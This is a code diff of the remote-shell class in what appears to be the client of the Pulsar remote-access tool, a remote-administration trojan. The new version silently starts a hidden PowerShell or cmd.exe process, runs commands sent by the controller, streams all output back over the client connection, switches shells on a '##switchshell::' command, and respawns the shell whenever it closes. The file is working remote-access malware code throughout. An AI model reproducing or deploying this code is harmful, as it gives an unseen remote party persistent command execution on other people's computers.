@@ -1,333 +1,273 @@
 ﻿using Pulsar.Client.Networking;
-using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.RemoteShell;
 using System;
 using System.Diagnostics;
-using System.Globalization;
 using System.IO;
 using System.Text;
-using System.Threading;
+using System.Text.RegularExpressions;
 
 namespace Pulsar.Client.IO
 {
-    /// <summary>
-    /// This class manages a remote shell session.
-    /// </summary>
     public class Shell : IDisposable
     {
-        /// <summary>
-        /// The process of the command-line (cmd).
-        /// </summary>
-        private Process _prc;
-
-        /// <summary>
-        /// Decides if we should still read from the output.
-        /// <remarks>
-        /// Detects unexpected closing of the shell.
-        /// </remarks>
-        /// </summary>
-        private bool _read;
-
-        /// <summary>
-        /// The lock object for the read variable.
-        /// </summary>
-        private readonly object _readLock = new object();
-
-        /// <summary>
-        /// The lock object for the StreamReader.
-        /// </summary>
-        private readonly object _readStreamLock = new object();
-
-        /// <summary>
-        /// The current console encoding.
-        /// </summary>
-        private Encoding _encoding;
-
-        /// <summary>
-        /// Redirects commands to the standard input stream of the console with the correct encoding.
-        /// </summary>
-        private StreamWriter _inputWriter;
-
-        /// <summary>
-        /// The client to sends responses to.
-        /// </summary>
         private readonly PulsarClient _client;
+        private Process _process;
+        private StreamWriter _stdin;
 
-        /// <summary>
-        /// Initializes a new instance of the <see cref="Shell"/> class using a given client.
-        /// </summary>
-        /// <param name="client">The client to send shell responses to.</param>
+        private bool _disposed;
+        private readonly object _sync = new object();
+
+        private string _currentMode = "powershell";
+
+        // Ensures startup messages fire ONLY once
+        private bool _startupCompleted = false;
+
         public Shell(PulsarClient client)
         {
             _client = client;
+            StartShell();
         }
 
-        /// <summary>
-        /// Creates a new session of the shell.
-        /// </summary>
-        private void CreateSession()
+
+        private void StartShell()
         {
-            lock (_readLock)
-            {
-                _read = true;
-            }
+            if (_disposed) return;
 
-            var cultureInfo = CultureInfo.InstalledUICulture;
-            _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);
+            LaunchShell(_currentMode);
 
-            _prc = new Process
+            // Prevent duplicate startup messages
+            if (!_startupCompleted)
             {
-                StartInfo = new ProcessStartInfo("cmd")
+                _startupCompleted = true;
+
+                //_client.Send(new DoShellExecuteResponse
+                //{
+                //    Output = ">> Type 'exit' to close this session\n"
+                //});
+
+                _client.Send(new DoShellExecuteResponse
                 {
+                    Output = ">> New Shell Session Started\n"
+                });
+            }
+        }
+
+
+        private void LaunchShell(string mode)
+        {
+            lock (_sync)
+            {
+                if (_disposed) return;
+
+                string file, args;
+
+                if (mode == "powershell")
+                {
+                    file = "powershell.exe";
+                    args = "-NoLogo -NoExit";
+                }
+                else
+                {
+                    file = "cmd.exe";
+                    args = "/Q /K \"prompt CMD $P$G\"";
+                }
+
+                var psi = new ProcessStartInfo
+                {
+                    FileName = file,
+                    Arguments = args,
                     UseShellExecute = false,
-                    CreateNoWindow = true,
                     RedirectStandardInput = true,
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
-                    StandardOutputEncoding = _encoding,
-                    StandardErrorEncoding = _encoding,
-                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
-                    Arguments = $"/K CHCP {_encoding.CodePage}"
+                    StandardOutputEncoding = Encoding.UTF8,
+                    StandardErrorEncoding = Encoding.UTF8,
+                    CreateNoWindow = true
+                };
+
+                _process = new Process
+                {
+                    StartInfo = psi,
+                    EnableRaisingEvents = true
+                };
+
+                _process.OutputDataReceived += ProcessOutput;
+                _process.ErrorDataReceived += ProcessOutput;
+                _process.Exited += (_, __) => RestartShell();
+
+                _process.Start();
+
+                _stdin = _process.StandardInput;
+                _stdin.AutoFlush = true;
+
+                _process.BeginOutputReadLine();
+                _process.BeginErrorReadLine();
+
+                // Trigger prompt once
+                if (mode == "powershell")
+                {
+                    try { _stdin.Write("\n"); _stdin.Flush(); } catch { }
                 }
-            };
-            _prc.Start();
+                else // CMD
+                {
+                    try { _stdin.Write("echo.\n"); _stdin.Flush(); } catch { }
+                }
+            }
+        }
 
-            RedirectIO();
 
+        private string _pendingCmdPrompt = null;
+
+        private static readonly Regex CmdPromptRegex =
+            new Regex(@"^[A-Z]:\\.*>$", RegexOptions.IgnoreCase);
+
+        private void ProcessOutput(object sender, DataReceivedEventArgs e)
+        {
+            if (string.IsNullOrEmpty(e.Data))
+                return;
+
+            string line = e.Data.Replace("\r", "");
+
+            if (_currentMode == "cmd")
+            {
+                // If this line IS a CMD prompt
+                if (CmdPromptRegex.IsMatch(line))
+                {
+                    // ALWAYS print prompt on a new line
+                    _client.Send(new DoShellExecuteResponse
+                    {
+                        Output = "\n" + line + "\n"
+                    });
+
+                    return;
+                }
+
+                // Normal output
+                _client.Send(new DoShellExecuteResponse
+                {
+                    Output = line + "\n"
+                });
+
+                return;
+            }
+
+            // --------------------------------------------
+            // PowerShell / normal mode
+            // --------------------------------------------
             _client.Send(new DoShellExecuteResponse
             {
-                Output = "\n>> New Session created\n"
+                Output = line + "\n"
             });
         }
 
-        /// <summary>
-        /// Starts the redirection of input and output.
-        /// </summary>
-        private void RedirectIO()
-        {
-            _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
-            new Thread(RedirectStandardOutput).Start();
-            new Thread(RedirectStandardError).Start();
-        }
 
-        /// <summary>
-        /// Reads the output from the stream.
-        /// </summary>
-        /// <param name="firstCharRead">The first read char.</param>
-        /// <param name="streamReader">The StreamReader to read from.</param>
-        /// <param name="isError">True if reading from the error-stream, else False.</param>
-        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
+
+        private void RestartShell()
         {
-            lock (_readStreamLock)
+            lock (_sync)
             {
-                var streamBuffer = new StringBuilder();
+                if (_disposed) return;
+                if (_process != null && !_process.HasExited)
+                    return;
 
-                streamBuffer.Append((char)firstCharRead);
-
-                // While there are more characters to be read
-                while (streamReader.Peek() > -1)
-                {
-                    // Read the character in the queue
-                    var ch = streamReader.Read();
-
-                    // Accumulate the characters read in the stream buffer
-                    streamBuffer.Append((char)ch);
-
-                    if (ch == '\n')
-                        SendAndFlushBuffer(ref streamBuffer, isError);
-                }
-                // Flush any remaining text in the buffer
-                SendAndFlushBuffer(ref streamBuffer, isError);
+                DisposeProcessOnly();
+                LaunchShell(_currentMode);
             }
         }
 
-        /// <summary>
-        /// Sends the read output to the Client.
-        /// </summary>
-        /// <param name="textBuffer">Contains the contents of the output.</param>
-        /// <param name="isError">True if reading from the error-stream, else False.</param>
-        private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
+
+        public bool ExecuteCommand(string cmd)
         {
-            if (textBuffer.Length == 0) return;
+            if (_disposed) return false;
 
-            var toSend = ConvertEncoding(_encoding, textBuffer.ToString());
-
-            if (string.IsNullOrEmpty(toSend)) return;
-
-            _client.Send(new DoShellExecuteResponse { Output = toSend, IsError = isError });
-
-            textBuffer.Clear();
-        }
-
-        /// <summary>
-        /// Reads from the standard output-stream.
-        /// </summary>
-        private void RedirectStandardOutput()
-        {
-            try
+            if (cmd.StartsWith("##switchshell::"))
             {
-                int ch;
-
-                // The Read() method will block until something is available
-                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
-                {
-                    ReadStream(ch, _prc.StandardOutput, false);
-                }
-
-                lock (_readLock)
-                {
-                    if (_read)
-                    {
-                        _read = false;
-                        throw new ApplicationException("session unexpectedly closed");
-                    }
-                }
+                SwitchShell(cmd.Substring("##switchshell::".Length));
+                return true;
             }
-            catch (ObjectDisposedException)
-            {
-                // just exit
-            }
-            catch (Exception ex)
-            {
-                if (ex is ApplicationException || ex is InvalidOperationException)
-                {
-                    _client.Send(new DoShellExecuteResponse
-                    {
-                        Output = "\n>> Session unexpectedly closed\n",
-                        IsError = true
-                    });
 
-                    CreateSession();
-                }
-            }
-        }
+            if (cmd.Trim().Equals("cls", StringComparison.OrdinalIgnoreCase))
+                cmd = _currentMode == "powershell" ? "Clear-Host" : "cls";
 
-        /// <summary>
-        /// Reads from the standard error-stream.
-        /// </summary>
-        private void RedirectStandardError()
-        {
-            try
-            {
-                int ch;
-
-                // The Read() method will block until something is available
-                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
-                {
-                    ReadStream(ch, _prc.StandardError, true);
-                }
-
-                lock (_readLock)
-                {
-                    if (_read)
-                    {
-                        _read = false;
-                        throw new ApplicationException("session unexpectedly closed");
-                    }
-                }
-            }
-            catch (ObjectDisposedException)
-            {
-                // just exit
-            }
-            catch (Exception ex)
-            {
-                if (ex is ApplicationException || ex is InvalidOperationException)
-                {
-                    _client.Send(new DoShellExecuteResponse
-                    {
-                        Output = "\n>> Session unexpectedly closed\n",
-                        IsError = true
-                    });
-
-                    CreateSession();
-                }
-            }
-        }
-
-        /// <summary>
-        /// Executes a shell command.
-        /// </summary>
-        /// <param name="command">The command to execute.</param>
-        /// <returns>False if execution failed, else True.</returns>
-        public bool ExecuteCommand(string command)
-        {
-            if (_prc == null || _prc.HasExited)
+            lock (_sync)
             {
                 try
                 {
-                    CreateSession();
-                }
-                catch (Exception ex)
-                {
-                    _client.Send(new DoShellExecuteResponse
+                    if (_process == null || _process.HasExited)
+                        RestartShell();
+
+                    if (_stdin == null)
+                        return false;
+
+                    const int chunkSize = 512;
+
+                    for (int i = 0; i < cmd.Length; i += chunkSize)
                     {
-                        Output = $"\n>> Failed to creation shell session: {ex.Message}\n",
-                        IsError = true
-                    });
+                        string part = cmd.Substring(i, Math.Min(chunkSize, cmd.Length - i));
+                        _stdin.Write(part);
+                        _stdin.Flush();
+                    }
+
+                    _stdin.Write("\n\n");
+                    _stdin.Flush();
+
+                    return true;
+                }
+                catch
+                {
+                    RestartShell();
                     return false;
                 }
             }
-
-            _inputWriter.WriteLine(ConvertEncoding(_encoding, command));
-            _inputWriter.Flush();
-
-            return true;
         }
 
-        /// <summary>
-        /// Converts the encoding of an input string to UTF-8 format.
-        /// </summary>
-        /// <param name="sourceEncoding">The source encoding of the input string.</param>
-        /// <param name="input">The input string.</param>
-        /// <returns>The input string in UTF-8 format.</returns>
-        private string ConvertEncoding(Encoding sourceEncoding, string input)
-        {
-            var utf8Text = Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input));
-            return Encoding.UTF8.GetString(utf8Text);
-        }
 
-        /// <summary>
-        /// Releases all resources used by this class.
-        /// </summary>
-        public void Dispose()
+        private void SwitchShell(string mode)
         {
-            Dispose(true);
-            GC.SuppressFinalize(this);
-        }
-
-        protected virtual void Dispose(bool disposing)
-        {
-            if (disposing)
+            lock (_sync)
             {
-                lock (_readLock)
-                {
-                    _read = false;
-                }
+                string normalized = (mode == "powershell") ? "powershell" : "cmd";
 
-                if (_prc == null)
+                // Already in shell → do nothing
+                if (_currentMode == normalized)
                     return;
 
-                if (!_prc.HasExited)
-                {
-                    try
-                    {
-                        _prc.Kill();
-                    }
-                    catch
-                    {
-                    }
-                }
+                _currentMode = normalized;
 
-                if (_inputWriter != null)
-                {
-                    _inputWriter.Close();
-                    _inputWriter = null;
-                }
+                DisposeProcessOnly();
+                LaunchShell(_currentMode);
 
-                _prc.Dispose();
-                _prc = null;
+                _client.Send(new DoShellExecuteResponse
+                {
+                    Output = $">> Switched to {_currentMode}\n"
+                });
             }
+        }
+
+
+        private void DisposeProcessOnly()
+        {
+            lock (_sync)
+            {
+                if (_process != null)
+                {
+                    try { _process.OutputDataReceived -= ProcessOutput; } catch { }
+                    try { _process.ErrorDataReceived -= ProcessOutput; } catch { }
+                    try { _stdin?.Close(); } catch { }
+                    try { if (!_process.HasExited) _process.Kill(); } catch { }
+                    try { _process.Dispose(); } catch { }
+                }
+
+                _stdin = null;
+                _process = null;
+            }
+        }
+
+
+        public void Dispose()
+        {
+            _disposed = true;
+            DisposeProcessOnly();
         }
     }
 }
